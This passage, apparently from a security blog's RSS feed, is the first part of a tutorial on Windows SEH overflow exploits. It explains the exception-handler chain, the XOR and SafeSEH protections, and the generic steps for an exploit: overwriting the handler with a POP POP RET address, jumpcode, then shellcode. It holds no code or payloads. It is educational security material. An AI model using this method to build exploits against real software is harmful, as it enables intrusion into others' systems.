When a program is executed and when the process is created, the pointer to the top of the SEH chain (the head of the seh chain) is placed at the top of the main data block of the process. When an exception occurs , windows ntdll.dll retrives the head of the seh chain (which is placed at the top of the main data block), walks through the list and tries to find the suitable handler. If no handler is found the default win32 handler will be used (which is at the bottom of the stack, the one after FFFFFFFF).<br />
<br />
<b><u>Protections mechanisms to stop SEH exploit</u></b><br />
<br />
a)	<b>XOR protection</b><br />
Since Windows XP SP1, before the exception handler is called, all registers are XORed with each other, making them all point to 0×00000000, which complicates exploit building. That means that you may see that one or more registers point at your payload at the first chance exception (before control is passed to exception handler), but when the Exception Handler kicks in, these registers are cleared again (so you cannot jump to them directly in order to execute your shellcode)<br />
b)	<b>Safeseh</b><br />
         Some additional protection was added to compilers, to stop the a SEH overwrites. This protection mechanism is active for all dll&#8217;s or exe&#8217;s that are compiled with /safeSEH<br />
<br />
<b><u>Steps to follow to write seh exploit</u></b><br />
<br />
In order to write an SEH overlfow exploit, these are the steps to follow:<br />
a)	Cause an exception, so that SEH handler kicks in.<br />
b)	Overwrite the SE handler on the stack with a pointer to the instruction that will bring you back to the next seh and execute jumpcode(the address of the POP POP RET instruction), this will put the address of top of the seh chain (pointer to the next seh record) on to eip, making it execute what ever is in that location.<br />
c)	We put some jumpcode inside the next seh, so that it jumps to the shellcode (which is right after the SE handler).<br />
d)	We place shellcode directly after the SE handler.<br />
<br />
This was about the basics required to understand SEH overflow Now lets get into the fun part of exploiting the SEH vulnerability in the software.<br />
<br />
Continued in Part2 (<a href="http://www.garage4hackers.com/blogs/1164/seh-overflow-exploit-poc-part-2-238" target="_blank">http://www.garage4hackers.com/blogs/...poc-part-2-238</a>)</blockquote>

]]></content:encoded>
			<dc:creator>m0nna</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=237</guid>
		</item>
	</channel>
</rss>
